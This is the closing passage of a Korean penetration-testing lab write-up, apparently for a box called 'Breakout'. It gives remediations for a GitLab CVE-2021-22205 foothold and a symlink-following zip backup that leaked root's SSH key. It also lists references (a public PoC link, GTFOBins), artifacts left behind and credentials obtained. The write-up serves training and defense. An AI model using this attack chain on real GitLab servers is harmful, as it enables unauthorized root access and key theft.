| 백업 스크립트가 심링크를 추종(`zip` 기본 동작) | `zip -y`(또는 `tar` 기본, `rsync -a`)로 링크 보존. 더 나은 방법은 아카이브 전 `find … -type l -delete` 로 링크 자체를 제거 |
| `PermitRootLogin` 이 키 로그인 허용 | `PermitRootLogin no`. 관리 작업은 `sudo` 경유. root 키를 얻어도 즉시 셸이 안 되게 |
| 호스트 root 키가 `/root/.ssh/id_rsa` 에 상주 | 필요 없으면 삭제. 필요하면 패스프레이즈 + `ssh-agent` 포워딩 |
| 패치 미적용(`39 updates`, 재부팅 대기) | 정기 패치·재부팅 창 운영. 커널 5.4.0-90은 로컬 익스플로잇 후보가 다수 |

### 방어 우선순위 — 하나만 고친다면

**바인드 마운트를 읽기 전용으로 바꾸는 것**이다. GitLab 패치는 다음 CVE가 나오면 또 뚫리지만, 컨테이너가 호스트 디렉터리에 못 쓰면 foothold가 root로 이어지지 않는다. 리포트에는 "깊이 방어(defense in depth)" 논리로 이 순서를 적는다.

---

## 9. 참고 자료

- **CVE-2021-22205** — GitLab CE/EE unauthenticated RCE (CVSS 10.0)
  https://nvd.nist.gov/vuln/detail/CVE-2021-22205
  https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22205.json
- **CVE-2021-22204** — ExifTool DjVu ANT 청크 Perl 코드 실행 (근본 원인)
  https://nvd.nist.gov/vuln/detail/CVE-2021-22204
  ExifTool 취약 범위: 7.44 – 12.23 (12.24 에서 수정)
- 사용한 PoC: https://github.com/inspiringz/CVE-2021-22205
- GitLab 익명 사용자 열거 이슈: https://gitlab.com/gitlab-org/gitlab-foss/-/work_items/40158
- GitLab Users API: `/api/v4/users/<id>` · `/api/v4/users?per_page=100`
- Info-ZIP `zip(1)` — `-y, --symlinks: store symbolic links as such in the zip archive` (**미지정 시 링크를 따라간다**)
- GTFOBins: https://gtfobins.github.io/ — `zip` · `tar` · `unzip` 항목의 파일 읽기/쓰기 프리미티브
- 컨테이너 탈출 참고: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/
- `pspy` (크론·프로세스 감시): https://github.com/DominicBreuker/pspy

## 남긴 흔적

| 항목 | 상태 |
|---|---|
| `/var/log/gitlab/gitaly/keykey` (root 키 심볼릭 링크) | 남아 있음 — 랩 Stop/Revert로 소멸 |
| `/opt/backups/log_backup.zip` 안의 root 개인키 사본 | 남아 있음 |
| `/tmp/srv/gitlab/logs/**` (전개된 로그 트리) | 남아 있음 |
| GitLab에 업로드된 악성 DjVu/JPEG (`/uploads/**`) | 남아 있음 |
| GitLab 로그(`production.log`, `api_json.log`)의 익스플로잇 요청 기록 | 남아 있음 |

획득 자격증명: `coaran` 개인키(`~/backups/mykey`, comment `coaran@breakout`), `root` 개인키(`/root/.ssh/id_rsa`).
열거된 계정: `root`(Administrator) · `webmaster` · `michelle` · `coaran`.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — "응답이 성공을 뜻하지 않는다" 패턴 · 시험 금지 도구의 수동 대안
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] — 같은 패턴 누적
- [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] — **크론 기반 권한상승** 패턴
- [[Hub]] · [[Levram]] — "버전 판정은 독립 근거 2개"
